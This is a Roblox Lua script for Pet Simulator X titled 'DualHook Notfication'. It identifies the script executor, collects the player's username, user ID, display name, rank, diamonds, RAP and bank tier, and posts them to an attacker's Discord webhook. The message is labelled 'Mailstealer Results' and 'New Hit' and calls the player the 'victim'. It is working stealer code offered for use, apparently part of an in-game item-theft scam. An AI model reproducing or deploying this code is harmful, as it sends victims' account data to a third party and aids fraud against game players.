--//DualHook Notfication

local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "Sirhurt") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getscriptenvs and "Calamari") or
		(unit and not syn and "Unit") or
		(OXYGEN_LOADED and "Oxygen U") or
		(IsElectron and "Electron") or
		("Unsupported")
  
	return exploit
  end
  
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "â Couldn't find game"
end
local webhookcolor = "13369599"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local function sendwebhook(msg)
local msg = {
	["content"]= "**New Hit With Arkhalis Premium**",
	["embeds"]= {
	  {
		["title"]= "`Mailstealer Results`",
		["description"]= "**Data from the victim**\nđ§Display Name: ".._G.PlrDisplayNameVictim.."\nđ§Username: ".._G.PlrUserVictim.."\nđ§User ID: ".._G.PlrUserIDVictim.."\nđąRank: ".._G.CurrentRank.."\nđŽPlace: ".._G.GameIn.."\nđGems: **".._G.DisplayDiamond.."**\nâŹď¸Rap: **".._G.DisplayRap.."**\nđBank Tier: **".._G.DisplayBankTier.."**\nâ Executor: **"..getexploit().."**",
		["url"]= "https://discord.gg/5MFcdt2kaj",
		["color"]= ""..webhookcolor.."",
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.WebhookDualHook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
sendwebhook(msg)
